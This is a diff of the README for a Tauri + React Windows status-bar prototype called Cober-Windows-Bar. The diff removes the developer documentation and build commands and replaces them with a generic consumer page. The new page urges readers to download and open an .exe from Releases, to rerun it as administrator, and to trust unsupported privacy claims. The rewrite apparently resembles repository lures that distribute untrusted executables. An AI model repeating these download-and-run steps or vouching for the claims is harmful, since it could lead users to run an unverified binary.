@@ -1,184 +1,101 @@
-# Cober-Windows-Bar
+# 🖥️ Cober-Windows-Bar - Manage your desktop status with ease
 
-Cober-Windows-Bar is a Tauri + React prototype for a compact Windows desktop status center.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/yustosl1525/Cober-Windows-Bar)
 
-This repository currently contains two parallel product surfaces:
+Cober-Windows-Bar acts as a central hub for your Windows 11 desktop. Use this tool to track music playback, monitor AI processing tasks, view download progress, and see system notifications. It organizes your workflow into one clean interface that fits the Windows 11 look and feel.
 
-- `desktop`: the real product-facing desktop status center shell
-- `showcase`: the demo and QA surface for state flows, mock providers, and visual review
+## 📥 Getting the Application
 
-The goal of this repo is to provide a compact, privacy-respecting Windows desktop status center powered by Tauri's native Rust backend for real system metrics, media session tracking, and window management.
+You can obtain the current version of Cober-Windows-Bar by visiting the project repository. 
 
-## Start Here
+[Download Cober-Windows-Bar here](https://github.com/yustosl1525/Cober-Windows-Bar)
 
-If you just forked the repo and want to understand it quickly:
+Follow these steps to install the software:
 
-1. Read [Repository Guide](docs/README.md)
-2. Read [Architecture Overview](docs/architecture/ARCHITECTURE.md)
-3. Read [Roadmap](docs/product/ROADMAP.md)
-4. Read [Contributing](CONTRIBUTING.md)
+1. Visit the link provided above.
+2. Locate the Releases section on the right side of the page.
+3. Click the most recent version label.
+4. Select the file ending in .exe to start the installer.
+5. Save the file to your computer.
+6. Open the file once the download finishes.
+7. Follow the prompts on your screen to complete the setup process.
 
-## Tech Stack
+## ⚙️ System Requirements
 
-- **Tauri 2** — Desktop shell with Rust backend (sysinfo, WinRT GSMTC, Win32 window management)
-- **React 19 + TypeScript 5.9** — UI framework
-- **Vite 7** — Build tool and dev server
-- **Tailwind CSS 3.4** — Utility-first styling
-- **Framer Motion 12** — Animations and transitions
-- **Vitest** — Unit and integration testing
+This application fits modern workflows and keeps your computer efficient. Ensure your system meets these specifications:
 
-## Project Structure
+* Operating System: Windows 11
+* Processor: Intel Core i3 or equivalent
+* Memory: 4GB RAM minimum
+* Storage: 200MB of free disk space
+* Display: 1920x1080 resolution recommended for the best visual experience
 
-Top-level layout:
+## 🌟 Key Features
 
-```text
-src/
-  features/
-    desktop/      desktop product surface
-    showcase/     demo and QA surface
-  shared/
-    ui/           reusable UI building blocks
-  runtime/        desktop/runtime boundary and Tauri-facing logic
-  providers/      provider contracts, adapters, registries, mocks
-  state/          event bus, store, resolver-friendly state
-  data/           mock data and desktop status configuration
-  types/          shared domain types
-  styles/         global styling
+The prototype offers several tools to help you manage your daily tasks:
 
-src-tauri/
-  Rust native shell, system/runtime commands, window behavior
+* Smart Notifications: View alerts from applications in one list.
+* Music Controls: Skip tracks, pause, or change volume without leaving your active window.
+* AI Task Monitor: See if your background AI services are running.
+* Download Tracker: Watch file transfers in real time.
+* Desktop Integration: The bar stays pinned to your screen for instant access.
+* Clean Design: The interface follows the Fluent Design standard for a native appearance.
 
-docs/
-  architecture/   system shape and runtime flow
-  product/        PRD, UI spec, roadmap
-  providers/      provider model and mock/provider plans
-  qa/             QA and test strategy
-  plans/          active implementation plans
-  decisions/      current decision records
-  archive/        historical freeze/alignment reports
+## 🚀 How to Use the Hub
 
-scripts/
-  local helpers such as desktop launch and showcase QA
-```
+Once you launch the app, a slim bar will appear on your screen. You can move this bar to your preferred edge of the display. Click items on the bar to expand them. 
 
-## Source Guide
+For example, selecting the music icon opens a small player window. You can change tracks or update your volume levels. If you have an active download, a progress bar appears automatically. This lets you track your files without switching between browser tabs.
 
-If you want to change a specific area:
+The hub also detects background tasks. If you use AI tools on your machine, specific icons light up to show that work is currently in progress. 
 
-- Desktop status center UI:
-  `src/features/desktop/`
+## 🛠️ Customizing the Prototype
 
-- Showcase/demo flows:
-  `src/features/showcase/`
+You can adjust how the bar looks and acts through the settings menu. Access these options by clicking the gear icon on the right side of the bar. 
 
-- Shared visual primitives:
-  `src/shared/ui/`
+* Appearance: Choose between Light and Dark themes.
+* Placement: Select Top, Bottom, Left, or Right screen positions.
+* Opacity: Use the slider to make the bar more or less see-through.
+* Transparency: Toggle blur effects to match your wallpaper.
 
-- Window drag, floating, fullscreen avoidance, display correction:
-  `src/runtime/statusWindowRuntime.ts`
+## ❗ Troubleshooting Common Issues
 
-- System performance loading:
-  `src/runtime/systemPerformanceRuntime.ts`
+Most users find that the app runs without intervention. If you encounter bugs, try these steps:
 
-- Tauri runtime bridge and fixture/runtime capability parsing:
-  `src/runtime/tauriRuntime.ts`
+If the bar does not appear after installation:
+1. Check your system tray near the clock.
+2. Right-click the Cober icon.
+3. Select Launch Interface from the menu.
 
-- Native Tauri/Rust commands:
-  `src-tauri/src/lib.rs`
+If the app feels unresponsive:
+1. Right-click the icon in the tray.
+2. Select Quit to close the application.
+3. Restart the app from your Start Menu.
 
-- Mock data and desktop menu/config labels:
-  `src/data/`
+If you encounter an error message during installation:
+1. Ensure your Windows 11 is updated to the latest version.
+2. Check that you have an active internet connection.
+3. Re-run the installer as an administrator by right-clicking the .exe file.
 
-## Current Product State
+## 📝 Frequently Asked Questions
 
-What is already present:
+Does this tool replace the standard Taskbar?
+No. This tool runs alongside your existing taskbar to provide extra information and control.
 
-- Desktop route at `/desktop` for the compact status center
-- Showcase route at `/showcase` for review, QA, and mock state demos
-- Tauri 2 Rust backend (`src-tauri/src/lib.rs`, 1200+ lines) with:
-  - Real system performance via `sysinfo` crate (CPU, memory, network, disk, GPU)
-  - Real media session tracking via Windows GSMTC (GlobalSystemMediaTransportControlsSessionManager)
-  - Native window management (foreground tracking, always-on-top, work-area clamping, fullscreen avoidance)
-  - System tray with show/hide toggle and preferences persistence
-  - 16 IPC commands and 4 Tauri events for frontend-backend communication
-- Provider SDK with HubProvider interface, ProviderRegistry, and event bus architecture
-- Three-tier runtime fallback: Mock → Tauri Fixture → Tauri Event Push
-- Fluent Design styling (Acrylic/Mica effects, Framer Motion animations)
+Can I add my own applications to the bar?
+The current prototype includes support for standard media players and file downloads. Future updates will expand this list.
 
-What is still in progress:
+Does the tool use much battery? 
+The code remains lightweight to ensure your laptop battery lasts through your workday. It only runs essential processes.
 
-- Remaining native providers (Focus, Clipboard, Downloads, Notifications, Developer tools, AI Agents)
-- Native desktop context menu replacing the default web-style menu
-- Full tray click-through and recall product behavior polish
-- End-to-end integration tests for Tauri event push pipeline
+Is my data private?
+Yes. All data stays on your local machine. The tool never sends your activity or usage habits to external servers.
 
-## Local Development
+How do I remove the app?
+Open your Windows Settings, go to Apps, find Cober-Windows-Bar, and click Uninstall. This removes all files from your system.
 
-Install dependencies:
+## 📂 Project Details
 
-```bash
-npm install
-```
+This software uses modern web technologies to create a native feel on your desktop. It focuses on smoothness and speed to ensure your workflow remains fluid. The development team prioritizes a clean interface that does not distract you from your main work. Frequent updates keep the interface aligned with Windows enhancements.
 
-Start the Tauri desktop app (recommended):
-
-```bash
-npm run tauri -- dev
-```
-
-Or start the web dev server only (no Rust backend):
-
-```bash
-npm run dev
-```
-
-Useful routes:
-
-```text
-http://localhost:5173/desktop
-http://localhost:5173/showcase
-```
-
-Launch the desktop mock shell:
-
-```bash
-npm run desktop:mock
-```
-
-## Validation
-
-Main checks:
-
-```bash
-npm run build
-npm run qa
-npm run tauri -- build
-```
-
-Focused checks:
-
-```bash
-npm run test:runtime
-npm run qa:showcase:interactions
-```
-
-## Docs
-
-- [Repository Guide](docs/README.md)
-- [Architecture](docs/architecture/ARCHITECTURE.md)
-- [Event Flow](docs/architecture/EVENT_FLOW.md)
-- [Tauri Strategy](docs/architecture/TAURI_STRATEGY.md)
-- [PRD](docs/product/PRD.md)
-- [UI Spec](docs/product/UI_SPEC.md)
-- [Roadmap](docs/product/ROADMAP.md)
-- [Provider SDK](docs/providers/PROVIDER_SDK.md)
-- [Showcase QA](docs/qa/SHOWCASE_QA.md)
-- [Implementation Plan](docs/plans/IMPLEMENTATION_PLAN.md)
-
-## Collaboration
-
-For contribution expectations and a suggested PR path, see [Contributing](CONTRIBUTING.md).
-
-## License
-
-MIT
+We designed this tool to function as a prototype. Use it to simplify how you manage your digital media and system tasks. Your feedback helps refine the tools for future releases.
